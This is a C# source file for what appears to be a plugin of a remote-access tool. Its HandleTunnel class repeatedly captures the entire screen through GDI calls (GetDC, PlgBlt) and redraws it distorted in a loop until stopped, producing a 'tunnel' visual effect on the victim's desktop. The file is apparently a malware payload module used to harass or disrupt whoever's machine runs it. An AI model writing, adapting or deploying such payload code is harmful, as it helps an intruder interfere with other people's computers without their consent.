using System;
using System.Threading;
using System.Windows.Forms;
using Plugin.Helper.GDI;

namespace Plugin.Handler.GDI;

internal class HandleTunnel
{
	public static CancellationTokenSource ctsStop;

	public static void Start()
	{
		if (ctsStop == null || ctsStop.IsCancellationRequested)
		{
			ctsStop = new CancellationTokenSource();
			_ = Screen.PrimaryScreen.Bounds.Width;
			_ = Screen.PrimaryScreen.Bounds.Height;
			int left = Screen.PrimaryScreen.Bounds.Left;
			int right = Screen.PrimaryScreen.Bounds.Right;
			int top = Screen.PrimaryScreen.Bounds.Top;
			int bottom = Screen.PrimaryScreen.Bounds.Bottom;
			NativeMethods.POINT[] array = new NativeMethods.POINT[3];
			while (!ctsStop.IsCancellationRequested)
			{
				IntPtr dC = NativeMethods.GetDC(IntPtr.Zero);
				array[0].X = left + 10;
				array[0].Y = top - 10;
				array[1].X = right + 10;
				array[1].Y = top + 10;
				array[2].X = left - 10;
				array[2].Y = bottom - 10;
				NativeMethods.PlgBlt(dC, array, dC, left - 20, top - 20, right - left + 40, bottom - top + 40, IntPtr.Zero, 0, 0);
				NativeMethods.DeleteDC(dC);
			}
		}
	}

	public static void Stop()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}
}
